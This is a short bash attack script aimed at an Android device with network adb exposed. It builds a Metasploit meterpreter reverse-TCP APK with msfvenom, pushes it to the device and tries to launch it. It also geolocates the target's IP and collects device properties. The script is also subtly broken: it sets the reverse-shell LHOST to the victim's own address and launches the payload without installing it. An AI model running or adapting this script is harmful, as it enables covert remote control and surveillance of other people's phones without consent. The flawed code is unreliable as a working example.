#!/bin/bash

# Function to generate a payload and send it to the target device
generate_payload() {
    local target_ip=$1
    local payload_name="payload.apk"

    # Generate a payload using msfvenom
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$target_ip LPORT=4444 -o /tmp/$payload_name

    # Transfer the payload to the Android device
    adb push /tmp/$payload_name /data/local/tmp/

    # Execute the payload on the Android device
    adb shell am start -n com.metasploit.stage/.MainActivity
}

# Function to get geolocation information
get_geolocation() {
    local target_ip=$1
    local geolocation_info=$(curl -s "http://ip-api.com/json/$target_ip" | jq '.city, .region, .country')
    echo "Geolocation Information:"
    echo "$geolocation_info"
}

# Function to get device information
get_device_info() {
    echo "Device Information:"
    adb shell getprop | grep -E "ro.product.model|ro.build.version.release|ro.build.version.sdk"
}

# Main script execution
read -p "Enter the target Android device IP address: " target_ip

# Establish a connection to the Android device
adb connect $target_ip

# Check if the connection was successful
if adb devices | grep -q "$target_ip:5555"; then
    echo "Connected to the Android device."
else
    echo "Failed to connect to the Android device. Please check the IP address and try again."
    exit 1
fi

# Generate a payload and send it to the target device
generate_payload $target_ip

# Get geolocation information
get_geolocation $target_ip

# Get device information
get_device_info

# Disconnect from the Android device
adb disconnect $target_ip

echo "Attack completed. Please check the Metasploit console for further details."
